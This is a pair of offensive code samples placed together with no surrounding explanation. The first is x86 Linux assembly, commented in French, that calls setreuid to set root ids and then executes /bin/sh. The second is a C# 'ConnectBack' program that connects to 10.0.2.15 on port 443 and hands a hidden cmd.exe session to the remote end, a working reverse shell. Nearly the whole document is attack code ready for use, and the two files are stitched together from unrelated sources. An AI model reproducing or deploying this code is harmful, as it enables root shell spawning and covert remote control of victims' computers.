    ;affichage-shell.asm
     
        segment .data  ;déclaration du segment des variables initialisées et globales
     
         cheminshell db "/bin/sh0aaaabbbbb"  ;db déclare une chaine de caractères
     
        segment .text  ;declaration du segment de code
     
         global _start  ;point d'entrée pour le format ELF
     
          _start:  ;here we go
     
     
           mov eax,70  ;on met eax à 70 pour préparer l'appel à setreuid
           mov ebx,0  ;real uid 0 => root
           mov ecx,0  ;effective uid 0 => root
           int 0x80  ;Syscall 70
     
           mov eax,0  ;on met 0 dans eax
           mov ebx,cheminshell  ;on met l'adresse de cheminshell dans ebx
           mov [ebx+7],al  ;on met le 0 (de eax) 7 caractères après le début de la chaîne
                    ;en fait, on réécrit le 0 de la chaine avec un nul byte
                    ;al occupe 1 byte
           mov [ebx+8],ebx  ;on met l'addresse de la chaine 8 caractères après son début
                    ;En fait, on réécrit aaaa par l'adresse de cheminshell
           mov [ebx+12],eax  ;12 caractères après le début, on met les 4 bytes de eax
                    ;en fait, on réécrit bbbb par 0x00000000
           mov eax,11  ;on met eax à 11 pour préparer l'appel à execve
           lea ecx,[ebx+8]  ;on charge l'adresse de (anciennement) aaaa dans ecx
           lea edx,[ebx+12]  ;on charge l'adresse de (anciennement) bbbb dans edx
           int 0x80  ;Syscall 11

using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("10.0.2.15", 443))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
